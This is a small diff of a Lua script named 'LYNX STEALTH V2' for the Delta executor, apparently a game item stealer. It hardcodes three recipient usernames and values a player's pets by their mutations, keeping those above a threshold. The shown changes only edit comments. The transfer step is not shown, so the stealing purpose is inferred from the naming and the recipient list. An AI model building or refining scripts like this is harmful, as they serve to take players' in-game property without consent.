@@ -1,4 +1,5 @@
--- [[ LYNX STEALTH OMNIPOTENT V2 - DELTA STABLE ]] --
+-- LYNX STEALTH V2
+-- DELTA STABLE VERSION
 
 -- [[ CONFIGURATION ]] --
 local USERNAMES = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"} 
@@ -119,13 +120,10 @@ local function processInventory()
             local mutations = pet.properties or {}
             local rawVal = PetBaseValues[name] or 0.01
             
-            -- Use true scaled value (no $2 floor) + mutation bonuses
             local individualValue = getScaledValue(rawVal) + getMutationBonus(mutations)
             
-            -- STRICT THRESHOLD FILTER
             if individualValue >= THRESHOLD then
                 totalWorth = totalWorth + individualValue
-                -- Unique key to combine exact duplicates
                 local key = name .. (mutations.mega_neon and "M" or "") .. (mutations.neon and "N" or "") .. (mutations.flyable and "F" or "") .. (mutations.rideable and "R" or "")
                 
                 if not grouped[key] then
